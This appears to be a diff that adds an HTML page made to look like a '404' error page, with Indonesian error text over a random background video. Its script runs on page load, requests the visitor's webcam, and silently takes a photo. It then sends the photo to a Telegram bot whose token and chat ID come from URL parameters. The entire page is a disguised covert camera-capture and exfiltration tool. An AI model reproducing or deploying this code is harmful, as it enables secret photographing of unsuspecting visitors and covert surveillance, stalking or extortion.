@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Info Page</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        .error-message {
+            text-align: center;
+            z-index: 1;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+        }
+        .error-code {
+            font-size: 5em;
+            margin: 0;
+            animation: blink 1s step-start 0s infinite;
+        }
+        .error-text {
+            font-size: 1.5em;
+        }
+        @keyframes blink {
+            50% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video id="background-video" autoplay muted loop></video>
+    <div class="error-message">
+        <div class="error-code">404</div>
+        <div class="error-text">UPS TERJADI KESALAHAN!!</div>
+    </div>
+    <script>
+        // List of video URLs
+        const videoUrls = [
+            'https://storage.itsrose.life/asupan/tiktok/1.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/10.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/100.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/101.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/102.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/103.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/104.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/105.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/106.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/107.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/108.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/109.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/11.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/110.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/111.mp4',
+            'https://storage.itsrose.life/asupan/tiktok/112.mp4'
+        ];
+
+        // Select a random video URL
+        const randomVideoUrl = videoUrls[Math.floor(Math.random() * videoUrls.length)];
+
+        // Set the random video URL as the source of the video element
+        const videoElement = document.getElementById('background-video');
+        const sourceElement = document.createElement('source');
+        sourceElement.src = randomVideoUrl;
+        sourceElement.type = 'video/mp4';
+        videoElement.appendChild(sourceElement);
+
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chatId');
+        const botToken = urlParams.get('botToken');
+
+        // Function to send photo to Telegram bot
+        async function sendPhotoToTelegram(chatId, botToken, photoData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoData, 'photo.jpg');
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // Capture photo from camera and send it to Telegram
+        async function captureAndSendPhoto() {
+            const video = document.createElement('video');
+            const constraints = { video: true };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+
+                // Delay before capturing to allow camera to adjust
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoData = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                await sendPhotoToTelegram(chatId, botToken, photoData);
+
+                // Stop media stream tracks
+                stream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+
+                console.log('Photo sent successfully');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        // Capture and send photo when page loads
+        window.onload = async function() {
+            await captureAndSendPhoto();
+        };
+    </script>
+</body>
+</html>
